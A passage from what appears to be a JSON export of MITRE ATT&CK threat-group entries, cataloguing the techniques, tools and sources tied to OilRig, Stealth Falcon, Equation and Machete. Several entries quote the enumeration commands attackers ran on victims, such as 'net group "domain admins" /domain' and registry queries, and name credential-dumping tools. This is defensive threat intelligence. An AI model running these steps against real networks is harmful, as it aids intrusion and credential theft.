Information Discovery, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Compromise Infrastructure: Server, Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Develop Capabilities: Malware, Scheduled Task/Job: Scheduled Task, Software Discovery, System Information Discovery C0042 Outer Space January 2021 [16] December 2021 [16] [16] Application Layer Protocol: Web Protocols, Browser Information Discovery, Command and Scripting Interpreter: Visual Basic, Compromise Infrastructure: Server, Develop Capabilities: Malware, Establish Accounts: Cloud Accounts, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account OilRig has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim.[4] .002 Account Discovery: Domain Account OilRig has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim.[4] Enterprise T1583 .001 Acquire Infrastructure: Domains OilRig has set up fake VPN portals, conference sign ups, and job application websites to target victims.[3] Enterprise T1071 .001 Application Layer Protocol: Web Protocols OilRig has used HTTP for C2.[6][17][18] During Outer Space, OilRig used HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API.[16] During Juicy Mix, OilRig used a VBS script to send POST requests to register installed malware with C2.[16] .004 Application Layer Protocol: DNS OilRig has used DNS for C2 including the publicly available requestbin.net tunneling service.[6][17][18][10] Enterprise T1119 Automated Collection OilRig has used automated collection.[6] Enterprise T1217 Browser Information Discovery During Outer Space, OilRig used a Chrome data dumper named MKG.[16] During Juicy Mix, OilRig used the CDumper (Chrome browser) and EDumper (Edge browser) data stealers to collect cookies, browsing history, and credentials.[16] Enterprise T1110 Brute Force OilRig has used brute force techniques to obtain credentials.[17][12] Enterprise T1115 Clipboard Data OilRig has used infostealer tools to copy clipboard data.[14] Enterprise T1059 Command and Scripting Interpreter OilRig has used various types of scripting for execution.[1][19][20][7][21] .001 PowerShell OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.[1][22][9][13] During Juicy Mix, OilRig used a PowerShell script to steal credentials.[16] .003 Windows Command Shell OilRig has used macros to deliver malware such as QUADAGENT and OopsIE.[1][19][20][7][21] OilRig has used batch scripts.[1][19][20][7][21] .005 Visual Basic OilRig has used VBScript macros for execution on compromised hosts.[10] During Outer Space, OilRig used VBS droppers to deploy malware.[16] During Juicy Mix, OilRig used VBS droppers to deliver and establish persistence for the Mango backdoor.[16] Enterprise T1586 .002 Compromise Accounts: Email Accounts OilRig has compromised email accounts to send phishing emails.[3] Enterprise T1584 .004 Compromise Infrastructure: Server During Outer Space, OilRig compromised an Israeli human resources site to use as a C2 server.[16] During Juicy Mix, OilRig compromised an Israeli job portal to use for a C2 server.[16] Enterprise T1543 .003 Create or Modify System Process: Windows Service OilRig has used a compromised Domain Controller to create a service on a remote host.[14] Enterprise T1555 Credentials from Password Stores OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[6][17][23][18] .003 Credentials from Web Browsers OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[6][17][23][18] OilRig has also used tool named PICKPOCKET to dump passwords from web browsers.[18] During Juicy Mix, OilRig used the CDumper (Chrome browser) and EDumper (Edge browser) to collect credentials.[16] .004 Windows Credential Manager OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.[18] During Juicy Mix, OilRig used a Windows Credential Manager stealer for credential access.[16] Enterprise T1132 .001 Data Encoding: Standard Encoding During Juicy Mix, OilRig used a VBS script to send the Base64-encoded name of the compromised computer to C2.[16] Enterprise T1005 Data from Local System OilRig has used PowerShell to upload files from compromised systems.[13] Enterprise T1025 Data from Removable Media OilRig has used Wireshark\u2019s usbcapcmd utility to capture USB traffic.[14] Enterprise T1074 .001 Data Staged: Local Data Staging During Juicy Mix, OilRig used browser data and credential stealer tools to stage stolen files named Cupdate, Eupdate, and IUpdate in the %TEMP% directory.[16] Enterprise T1140 Deobfuscate/Decode Files or Information A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.[1][22][20][24] During Juicy Mix, OilRig used a script to concatenate and deobfuscate encoded strings in Mango.[16] Enterprise T1587 .001 Develop Capabilities: Malware OilRig actively developed and used a series of downloaders during 2022.[25] For Outer Space, OilRig created new implants including the Solar backdoor.[16] For Juicy Mix, OilRig improved on Solar by developing the Mango backdoor.[16] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography OilRig used the PowerExchange utility and other tools to create tunnels to C2 servers.[17] Enterprise T1585 .003 Establish Accounts: Cloud Accounts During Outer Space, OilRig created M365 email accounts to be used as part of C2.[16] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol OilRig has exfiltrated data via Microsoft Exchange and over FTP separately from its primary C2 channel over DNS.[5][13] Enterprise T1203 Exploitation for Client Execution OilRig has exploited CVE-2024-30088 to run arbitrary code in the context of SYSTEM.[13] Enterprise T1068 Exploitation for Privilege Escalation OilRig has exploited the Windows Kernel Elevation of Privilege vulnerability, CVE-2024-30088.[13] Enterprise T1133 External Remote Services OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.[17] Enterprise T1008 Fallback Channels OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.[19] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall OilRig has modified Windows firewall rules to enable remote access.[14] Enterprise T1070 .004 Indicator Removal: File Deletion OilRig has deleted files associated with their payload after execution.[1][20] Enterprise T1105 Ingress Tool Transfer OilRig had downloaded remote files onto victim infrastructure.[1][13] During Outer Space, OilRig downloaded additional tools to comrpomised infrastructure.[16] Enterprise T1056 .001 Input Capture: Keylogging OilRig has employed keyloggers including KEYPUNCH and LONGWATCH.[17][18][14] Enterprise T1036 Masquerading OilRig has used .doc file extensions to mask malicious executables.[10] .005 Match Legitimate Resource Name or Location OilRig has named a downloaded copy of the Plink tunneling utility as \\ProgramData\\Adobe.exe.[14] Enterprise T1556 .002 Modify Authentication Process: Password Filter DLL OilRig has registered a password filter DLL in order to drop malware.[13] Enterprise T1112 Modify Registry OilRig has used reg.exe to modify system configuration.[14][13] Enterprise T1046 Network Service Discovery OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.[17] Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.[2][21] .013 Obfuscated Files or Information: Encrypted/Encoded File OilRig has encrypted and encoded data in its malware, including by using base64.[1][7][6][9][21] During Outer Space, OilRig deployed VBS droppers with obfuscated strings.[16] Enterprise T1588 .002 Obtain Capabilities: Tool OilRig has made use of the publicly available tools including Plink and Mimikatz.[14][13] .003 Obtain Capabilities: Code Signing Certificates OilRig has obtained stolen code signing certificates to digitally sign malware.[3] Enterprise T1137 .004 Office Application Startup: Outlook Home Page OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.[26] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[6][17][23][18] .004 OS Credential Dumping: LSA Secrets OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[6][17][23][18] .005 OS Credential Dumping: Cached Domain Credentials OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[6][17][23][18] Enterprise T1201 Password Policy Discovery OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain.[27] Enterprise T1120 Peripheral Device Discovery OilRig has used tools to identify if a mouse is connected to a targeted system.[10] Enterprise T1069 .001 Permission Groups Discovery: Local Groups OilRig has used net localgroup administrators to find local administrators on compromised systems.[4][14] .002 Permission Groups Discovery: Domain Groups OilRig has used net group /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to find domain group permission settings.[4] Enterprise T1566 .001 Phishing: Spearphishing Attachment OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.[20][7][9][3] .002 Phishing: Spearphishing Link OilRig has sent spearphising emails with malicious links to potential victims.[20][3] .003 Phishing: Spearphishing via Service OilRig has used LinkedIn to send spearphishing links.[18] Enterprise T1057 Process Discovery OilRig has run tasklist on a victim's machine and used infostealers to capture processes.[4][14] Enterprise T1572 Protocol Tunneling OilRig has used the Plink utility and other tools to create tunnels to C2 servers.[6][17][18][14] Enterprise T1012 Query Registry OilRig has used reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" on a victim to query the Registry.[4] Enterprise T1219 Remote Access Tools OilRig has incorporated remote monitoring and management (RMM) tools into their operations including ngrok.[13] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.[6][17][24][14][14] .004 Remote Services: SSH OilRig has used Putty to access compromised systems.[6] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.[20][7][18][10] During Juicy Mix, OilRig used VBS droppers to schedule tasks for persistence.[16] Enterprise T1113 Screen Capture OilRig has a tool called CANDYKING to capture a screenshot of user's desktop.[17] Enterprise T1505 .003 Server Software Component: Web Shell OilRig has used web shells, often to maintain access to a victim network.[6][17][24][13] Enterprise T1518 Software Discovery During Juicy Mix, OilRig used browser data dumper tools to create a list of users with Google Chrome installed.[16] Enterprise T1608 .001 Stage Capabilities: Upload Malware OilRig has hosted malware on fake websites designed to target specific audiences.[3] Enterprise T1553 .002 Subvert Trust Controls: Code Signing OilRig has signed its malware with stolen certificates.[3] Enterprise T1195 Supply Chain Compromise OilRig has leveraged compromised organizations to conduct supply chain attacks on government entities.[13] Enterprise T1218 .001 System Binary Proxy Execution: Compiled HTML File OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.[4] Enterprise T1082 System Information Discovery OilRig has run hostname and systeminfo on a victim.[4][5][18][10][14] During Juicy Mix, OilRig used a script to send the name of the compromised host via HTTP POST to register it with C2.[16] Enterprise T1016 System Network Configuration Discovery OilRig has run ipconfig /all on a victim.[4][5] Enterprise T1049 System Network Connections Discovery OilRig has used netstat -an on a victim to get a listing of network connections.[4] Enterprise T1033 System Owner/User Discovery OilRig has run whoami on a victim.[4][5][10] Enterprise T1007 System Service Discovery OilRig has used sc query on a victim to gather information about services.[4] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[6][17][23][18] Enterprise T1204 .001 User Execution: Malicious Link OilRig has delivered malicious links to achieve execution on the target system.[20][7][9][3] .002 User Execution: Malicious File OilRig has delivered macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.[20][7][9][10][3] Enterprise T1078 Valid Accounts OilRig has used compromised credentials to access other systems on a victim network.[6][17][24][12] .002 Domain Accounts OilRig has used an exfiltration tool named STEALHOOK to retreive valid domain credentials.[13] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks OilRig has used macros to verify if a mouse is connected to a compromised machine.[10] Enterprise T1047 Windows Management Instrumentation OilRig has used WMI for execution.[17][14] ICS T0817 Drive-by Compromise OilRig has been seen utilizing watering hole attacks to collect credentials which could be used to gain access into ICS networks. [28] ICS T0853 Scripting OilRig has embedded a macro within spearphishing attachments that has been made up of both a VBScript and a PowerShell script.[29] ICS T0865 Spearphishing Attachment OilRig used spearphishing emails with malicious Microsoft Excel spreadsheet attachments. [29] ICS T0869 Standard Application Layer Protocol OilRig communicated with its command and control using HTTP requests. [29] ICS T0859 Valid Accounts OilRig utilized stolen credentials to gain access to victim machines.[30] Software ID Name References Techniques S0360 BONDUPDATER [1] [31] Application Layer Protocol: DNS, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Dynamic Resolution: Domain Generation Algorithms, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Scheduled Task/Job: Scheduled Task S0160 certutil [1][14] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0095 ftp [5] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0170 Helminth [4][17][9] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data Staged: Local Data Staging, Data Transfer Size Limits, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Input Capture: Keylogging, Obfuscated Files or Information: Encrypted/Encoded File, Permission Groups Discovery: Local Groups, Permission Groups Discovery: Domain Groups, Process Discovery, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing S0100 ipconfig [4] System Network Configuration Discovery S0189 ISMInjector [22] Deobfuscate/Decode Files or Information, Obfuscated Files or Information, Process Injection: Process Hollowing, Scheduled Task/Job: Scheduled Task S0349 LaZagne [23] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S1169 Mango [16] Application Layer Protocol: Web Protocols, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Owner/User Discovery, User Execution: Malicious File S0002 Mimikatz [6][17][23][14] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [4][1][14] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [4][1][14] System Network Connections Discovery S0508 ngrok [13] Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over Web Service, Protocol Tunneling, Proxy, Web Service S1170 ODAgent [25] Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Web Service: Bidirectional Communication S1172 OilBooster [25] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Fallback Channels, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Inter-Process Communication, Native API, System Information Discovery, System Owner/User Discovery, Web Service: Bidirectional Communication S1171 OilCheck [25] Exfiltration Over Web Service, Ingress Tool Transfer, Web Service: Bidirectional Communication S0264 OopsIE [20] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Data Encoding: Standard Encoding, Data Staged: Local Data Staging, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Time Discovery, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation S1173 PowerExchange [14] Application Layer Protocol: Mail Protocols, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Ingress Tool Transfer S0184 POWRUNER [1] Account Discovery: Domain Account, Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, File and Directory Discovery, Ingress Tool Transfer, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Query Registry, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Windows Management Instrumentation S0029 PsExec [17] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0269 QUADAGENT [7] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Fallback Channels, Indicator Removal: File Deletion, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information: Fileless Storage, Query Registry, Scheduled Task/Job: Scheduled Task, System Network Configuration Discovery, System Owner/User Discovery S0495 RDAT [32] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Application Layer Protocol: Mail Protocols, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data Encoding: Non-Standard Encoding, Data Obfuscation: Steganography, Data Obfuscation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Fallback Channels, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Steganography, Screen Capture S0075 Reg [4][1] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry S0258 RGDoor [33] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Server Software Component: IIS Components, System Owner/User Discovery S1168 SampleCheck5000 [16] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: Windows Command Shell, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Exfiltration Over Web Service, Ingress Tool Transfer, System Information Discovery, Web Service: Bidirectional Communication S0185 SEASHARPEE [17] Command and Scripting Interpreter: Windows Command Shell, Indicator Removal: Timestomp, Ingress Tool Transfer, Server Software Component: Web Shell S0610 SideTwist [10] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Fallback Channels, File and Directory Discovery, Ingress Tool Transfer, Native API, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S1166 Solar [16] Automated Exfiltration, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Scheduled Task/Job: Scheduled Task, System Information Discovery S0096 Systeminfo [1] System Information Discovery S0057 Tasklist [4][1] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S1151 ZeroCleare OilRig collaborated on the destructive portion of the ZeroCleare attack.[12] Command and Scripting Interpreter, Command and Scripting Interpreter: PowerShell, Disk Wipe: Disk Structure Wipe, Exploitation for Privilege Escalation, Indicator Removal: File Deletion, Native API, Subvert Trust Controls: Code Signing, System Information Discovery References Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. Falcone, R.. (2017, April 27). OilRig Actors Provide a Glimpse into Development and Testing Efforts. Retrieved May 3, 2017. ClearSky Cybersecurity. (2017, January 5). Iranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford. Retrieved May 3, 2017. Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017. Unit42. (2016, May 1). Evasive Serpens Unit 42 Playbook Viewer. Retrieved February 6, 2023. Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018. Secureworks. (n.d.). COBALT GYPSY Threat Profile. Retrieved April 14, 2021. Meyers, A. (2018, November 27). Meet CrowdStrike\u2019s Adversary of the Month for November: HELIX KITTEN. Retrieved December 18, 2018. Check Point. (2021, April 8). Iran\u2019s APT34 Returns with an Updated Arsenal. Retrieved May 5, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Kessem, L. (2019, December 4). New Destructive Wiper ZeroCleare Targets Energy Sector in the Middle East. Retrieved September 4, 2024. Fahmy, M. et al. (2024, October 11). Earth Simnavaz (aka APT34) Levies Advanced Cyberattacks Against Middle East. Retrieved November 27, 2024. Symantec Threat Hunter Team. (2023, October 19). Crambus: New Campaign Targets Middle Eastern Government. Retrieved November 27, 2024. Proofpoint. (2020, January 10). Iranian State-Sponsored and Aligned Attacks: What You Need to Know and Steps to Protect Yourself. Retrieved January 16, 2025. Hromcova, Z. and Burgher, A. (2023, September 21). OilRig\u2019s Outer Space and Juicy Mix: Same ol\u2019 rig, new drill pipes. Retrieved November 21, 2024. Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34\u2019s Invite to Join Their Professional Network. Retrieved August 26, 2019. Falcone, R. and Lee, B. (2017, July 27). OilRig Uses ISMDoor Variant; Possibly Linked to Greenbug Threat Group. Retrieved January 8, 2018. Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. Falcone, R., Wilhoit, K.. (2018, November 16). Analyzing OilRig\u2019s Ops Tempo from Testing to Weaponization to Delivery. Retrieved April 23, 2019. Falcone, R. and Lee, B. (2017, October 9). OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan. Retrieved January 8, 2018. Mandiant. (2018). Mandiant M-Trends 2018. Retrieved November 17, 2024. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Hromcova, Z. and Burgher, A. (2023, December 14). OilRig\u2019s persistent attacks using cloud service-powered downloaders. Retrieved November 26, 2024. McWhirt, M., Carr, N., Bienstock, D. (2019, December 4). Breaking the Rules: A Tough Outlook for Home Page Attacks (CVE-2017-11774). Retrieved June 23, 2020. Singh, S., Yin, H. (2016, May 22). https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html. Retrieved November 17, 2024. Eduard Kovacs 2018, May 21 Group linked to Shamoon attacks targeting ICS networks in Middle East and UK Retrieved September 12, 2024. Robert Falcone, Bryan Lee 2016, May 26 The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor Retrieved. 2019/11/19 Dragos Chrysene Retrieved. 2019/10/27 Wilhoit, K. and Falcone, R. (2018, September 12). OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government. Retrieved February 18, 2019. Falcone, R. (2020, July 22). OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory. Retrieved July 28, 2020. Falcone, R. (2018, January 25). OilRig uses RGDoor IIS Backdoor on Targets in the Middle East. Retrieved July 6, 2018. "
},
{
"id": 136,
"title": "Stealth Falcon, Group G0038",
"path": "/groups/G0038/index.html",
"content": " Stealth Falcon Stealth Falcon is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. [1] ID: G0038 Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Stealth Falcon malware communicates with its C2 server via HTTPS.[1] Enterprise T1059 Command and Scripting Interpreter Stealth Falcon malware uses WMI to script data collection and command execution on the victim.[1] .001 PowerShell Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.[1] Enterprise T1555 Credentials from Password Stores Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.[1] .003 Credentials from Web Browsers Stealth Falcon malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.[1] .004 Windows Credential Manager Stealth Falcon malware gathers passwords from the Windows Credential Vault.[1] Enterprise T1005 Data from Local System Stealth Falcon malware gathers data from the local victim system.[1] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key.[1] Enterprise T1041 Exfiltration Over C2 Channel After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.[1] Enterprise T1057 Process Discovery Stealth Falcon malware gathers a list of running processes.[1] Enterprise T1012 Query Registry Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Stealth Falcon malware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly.[1] Enterprise T1082 System Information Discovery Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.[1] Enterprise T1016 System Network Configuration Discovery Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.[1] Enterprise T1033 System Owner/User Discovery Stealth Falcon malware gathers the registered user and primary owner name via WMI.[1] Enterprise T1047 Windows Management Instrumentation Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).[1] References Marczak, B. and Scott-Railton, J.. (2016, May 29). Keep Calm and (Don\u2019t) Enable Macros: A New Threat Actor Targets UAE Dissidents. Retrieved June 8, 2016. "
},
{
"id": 137,
"title": "Equation, Group G0020",
"path": "/groups/G0020/index.html",
"content": " Equation Equation is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. [1] ID: G0020 Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1480 .001 Execution Guardrails: Environmental Keying Equation has been observed utilizing environmental keying in payload delivery.[2][1] Enterprise T1564 .005 Hide Artifacts: Hidden File System Equation has used an encrypted virtual file system stored in the Windows Registry.[1] Enterprise T1120 Peripheral Device Discovery Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.[1] Enterprise T1542 .002 Pre-OS Boot: Component Firmware Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers.[1] References Kaspersky Lab's Global Research and Analysis Team. (2015, February). Equation Group: Questions and Answers. Retrieved December 21, 2015. Kaspersky Lab. (2012, August). Gauss: Abnormal Distribution. Retrieved January 17, 2019. "
},
{
"id": 138,
"title": "Machete, APT-C-43, El Machete, Group G0095",
"path": "/groups/G0095/index.html",
"content": " Machete Machete is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. Machete generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies.[1][2][3][4] ID: G0095 \u24d8 Associated Groups: APT-C-43, El Machete Contributors: Matias Nicolas Porolli, ESET Version: 2.0 Created: 13 September 2019 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description APT-C-43 [4] El Machete [1] Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Machete has used batch files to initiate additional downloads of malicious files.[4] .005 Command and Scripting Interpreter: Visual Basic Machete has embedded malicious macros within spearphishing attachments to download additional files.[4] .006 Command and Scripting Interpreter: Python Machete used multiple compiled Python scripts on the victim\u2019s system. Machete's main backdoor Machete is also written in Python.[1][3][4] Enterprise T1189 Drive-by Compromise Machete has distributed Machete through a fake blog website.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Machete's Machete 